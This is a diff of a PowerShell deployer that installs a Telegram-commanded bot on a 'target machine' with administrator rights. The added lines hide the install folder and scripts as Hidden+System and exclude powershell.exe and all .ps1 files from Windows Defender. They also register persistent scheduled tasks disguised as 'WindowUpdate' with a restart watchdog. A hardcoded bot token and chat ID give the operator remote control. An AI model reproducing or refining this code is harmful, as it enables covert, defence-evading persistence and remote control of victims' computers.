@@ -1,34 +1,35 @@
+# Run this on target machine to deploy the bot (as Administrator)
 # ============================================================
-#  Deploy-TGBot.ps1 - Persistent Telegram Bot Deployer (FIXED)
-#  Installs to: C:\Program Files\Catalogs\  (visible, not hidden)
-#  Adds Defender exclusion for that path only
-#  Ensures ONLY ONE bot instance runs at any time (mutex + watchdog)
-#  Run as Administrator
+#  M01.ps1 - Persistent Telegram Bot Deployer
+#  Installs to: C:\Program Files\Catalogs\  (hidden)
+#  Adds Defender exclusion for that path
+#  Ensures ONLY ONE bot instance runs at any time
 # ============================================================
 
-$installDir   = "$env:ProgramFiles\Catalogs"
-$installPath  = "$installDir\sys_tg.ps1"
+$installDir  = "$env:ProgramFiles\Catalogs"
+$installPath = "$installDir\sys_tg.ps1"
 $watchdogPath = "$installDir\sys_tg_watchdog.ps1"
-$logPath      = "$installDir\bot.log"
+$logPath     = "$installDir\bot.log"
 
-# ===== Ensure we're elevated =====
+# ===== Ensure we're elevated (needed to write to Program Files & add exclusions) =====
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
-# ===== Create install folder (visible, normal attributes) =====
+# ===== Create hidden install folder in Program Files =====
 if (-not (Test-Path $installDir)) {
     New-Item -Path $installDir -ItemType Directory -Force | Out-Null
 }
-# Explicitly CLEAR any Hidden/System attributes in case a prior run set them
+# Mark folder as Hidden + System
 $folderItem = Get-Item $installDir -Force
-$folderItem.Attributes = [System.IO.FileAttributes]::Directory
-Write-Host "[+] Install dir ready (visible): $installDir" -ForegroundColor Green
+$folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
 
-# ===== Add Windows Defender exclusion for install folder ONLY =====
+# ===== Add Windows Defender exclusion for install folder =====
 try {
     Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
     Write-Host "[+] Defender exclusion added for $installDir" -ForegroundColor Green
 } catch {
     Write-Host "[!] Could not add Defender exclusion: $_" -ForegroundColor Yellow
@@ -45,10 +46,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # ===== CONFIG =====
-$BOT_TOKEN       = "8946486449:AAFGKiqrXqI3Spjp33bQoDfDr9Svd2jEIwk"
-$ADMIN_CHAT_IDS  = @("347753116","7303070402","6716357143","380330092")
-$PRIMARY_CHAT_ID = "380330092"
-$CHAT_ID         = $PRIMARY_CHAT_ID   # <-- FIX: was undefined in original
+$BOT_TOKEN = "8946486449:AAFGKiqrXqI3Spjp33bQoDfDr9Svd2jEIwk"
+$CHAT_ID   = "380330092"
 
 $lastUpdate = 0
 $updateMode = $false
@@ -86,7 +85,7 @@ if (-not (Wait-ForNetwork)) {
 function Send($text, $replyToMessageId = $null) {
     $body = @{
         chat_id = $CHAT_ID
-        text    = "[$computerName]`n$text"
+        text = "[$computerName]`n$text"
     }
     if ($replyToMessageId) { $body.reply_to_message_id = $replyToMessageId }
 
@@ -132,9 +131,7 @@ function IsCommandProcessed($messageId, $commandText) {
     if ($script:processedCommands.ContainsKey($key)) { return $true }
     $script:processedCommands[$key] = $true
     if ($script:processedCommands.Count -gt 100) {
-        # FIX: materialize keys BEFORE removing, otherwise hashtable enumeration throws
-        $keysToRemove = @($script:processedCommands.Keys) | Select-Object -First 50
-        foreach ($k in $keysToRemove) { [void]$script:processedCommands.Remove($k) }
+        $script:processedCommands.Keys | Select-Object -First 50 | ForEach-Object { $script:processedCommands.Remove($_) }
     }
     return $false
 }
@@ -226,20 +223,18 @@ while ($true) {
     } catch {
         $consecutiveErrors++
         Write-Host "Error in main loop: $_"
-        # FIX: was `Start-Sleep (if (...) {...} else {...})` -> parse error in original
-        $sleepTime = if ($consecutiveErrors -gt 5) { 30 } else { 10 }
-        Start-Sleep -Seconds $sleepTime
+        Start-Sleep (if ($consecutiveErrors -gt 5) { 30 } else { 10 })
     }
 
-    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+    Start-Sleep (Get-Random -Minimum 1 -Maximum 3)
 }
 
 $mutex.ReleaseMutex()
 '@
 
-# Save bot script (visible, normal attributes)
+# Save bot script (also mark file hidden)
 Set-Content -Path $installPath -Value $script -Force
-Write-Host "[+] Bot script written: $installPath" -ForegroundColor Green
+(Get-Item $installPath -Force).Attributes = 'Hidden','System'
 
 # =====================================================================
 # ===== KILL ALL EXISTING BOT INSTANCES (clean slate) ================
@@ -251,7 +246,7 @@ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction Silen
 Start-Sleep -Seconds 2
 
 # =====================================================================
-# ===== WATCHDOG SCRIPT ==============================================
+# ===== WATCHDOG SCRIPT (ensures only one instance + restarts if dead) =
 # =====================================================================
 $watchdogScript = @"
 # Watchdog: ensures the bot is running (exactly one instance)
@@ -262,9 +257,11 @@ $watchdogScript = @"
     Where-Object { `$_.CommandLine -like "*sys_tg.ps1*" })
 
 if (`$instances.Count -eq 0) {
+    # No bot running — start it hidden, elevated (Task Scheduler runs as SYSTEM anyway)
     Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`$botFile`"" -WindowStyle Hidden
 }
 elseif (`$instances.Count -gt 1) {
+    # More than one — kill all but the newest
     `$sorted = `$instances | Sort-Object CreationDate -Descending
     `$sorted | Select-Object -Skip 1 | ForEach-Object {
         Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue
@@ -273,11 +270,12 @@ elseif (`$instances.Count -gt 1) {
 "@
 
 Set-Content -Path $watchdogPath -Value $watchdogScript -Force
-Write-Host "[+] Watchdog script written: $watchdogPath" -ForegroundColor Green
+(Get-Item $watchdogPath -Force).Attributes = 'Hidden','System'
 
 # =====================================================================
-# ===== SCHEDULED TASKS ==============================================
+# ===== SCHEDULED TASKS (persistent, infinite, single-instance) ======
 # =====================================================================
+
 $taskPath = "\WindowUpdate\"
 
 # --- Action for bot task ---
@@ -289,14 +287,13 @@ $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" `
     -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`""
 
 # --- Settings: infinite run, restart on failure, ignore duplicate launches ---
-# NOTE: omitted -ExecutionTimeLimit because (New-TimeSpan -Days 0) is undefined behavior.
-# Default for -ExecutionTimeLimit when not specified is "no limit" for tasks registered this way.
 $settings = New-ScheduledTaskSettingsSet `
     -AllowStartIfOnBatteries `
     -DontStopIfGoingOnBatteries `
     -StartWhenAvailable `
     -RestartInterval (New-TimeSpan -Minutes 1) `
     -RestartCount 999 `
+    -ExecutionTimeLimit (New-TimeSpan -Days 0) `
     -MultipleInstances IgnoreNew `
     -DontStopOnIdleEnd `
     -Priority 4
@@ -309,12 +306,14 @@ $watchdogSettings = New-ScheduledTaskSettingsSet `
     -ExecutionTimeLimit (New-TimeSpan -Minutes 2) `
     -MultipleInstances IgnoreNew
 
-# --- Triggers ---
+# --- Trigger 1: At startup ---
 $triggerStartup = New-ScheduledTaskTrigger -AtStartup
 $triggerStartup.Delay = "PT30S"
 
+# --- Trigger 2: At any user logon ---
 $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
 
+# --- Trigger 3: Repeat every 15 min forever ---
 $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
     -RepetitionInterval (New-TimeSpan -Minutes 15) `
     -RepetitionDuration (New-TimeSpan -Days 3650)
@@ -330,7 +329,7 @@ Register-ScheduledTask `
     -Trigger @($triggerStartup,$triggerLogon,$triggerRepeat) `
     -Settings $settings `
     -Principal $principal `
-    -Description "Runs Telegram bot. Single instance enforced by mutex." `
+    -Description "Runs Telegram bot. Infinite runtime. Single instance enforced by mutex." `
     -Force | Out-Null
 
 # --- Watchdog trigger: every 2 min, forever ---
@@ -352,8 +351,11 @@ Register-ScheduledTask `
 # =====================================================================
 # ===== START NOW =====================================================
 # =====================================================================
+
+# Start the bot immediately (one instance)
 Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -WindowStyle Hidden
 
+# Also trigger the scheduled tasks
 Start-ScheduledTask -TaskName "WindowUpdate1" -TaskPath $taskPath -ErrorAction SilentlyContinue
 Start-ScheduledTask -TaskName "WindowUpdate_Watchdog" -TaskPath $taskPath -ErrorAction SilentlyContinue
 
@@ -362,11 +364,12 @@ Start-ScheduledTask -TaskName "WindowUpdate_Watchdog" -TaskPath $taskPath -Error
 # =====================================================================
 Write-Host "==========================================" -ForegroundColor Green
 Write-Host " Bot deployed on $env:COMPUTERNAME" -ForegroundColor Green
-Write-Host " Install dir : $installDir (VISIBLE)" -ForegroundColor Green
+Write-Host " Install dir : $installDir (Hidden+System)" -ForegroundColor Green
 Write-Host " Bot script  : $installPath" -ForegroundColor Green
 Write-Host " Watchdog    : $watchdogPath" -ForegroundColor Green
 Write-Host " Defender    : $installDir excluded" -ForegroundColor Green
 Write-Host " Tasks       : \WindowUpdate\WindowUpdate1" -ForegroundColor Green
 Write-Host "               \WindowUpdate\WindowUpdate_Watchdog" -ForegroundColor Green
+Write-Host " Runtime     : INFINITE (no ExecutionTimeLimit)" -ForegroundColor Green
 Write-Host " Instances   : enforced single via Global Mutex" -ForegroundColor Green
 Write-Host "==========================================" -ForegroundColor Green
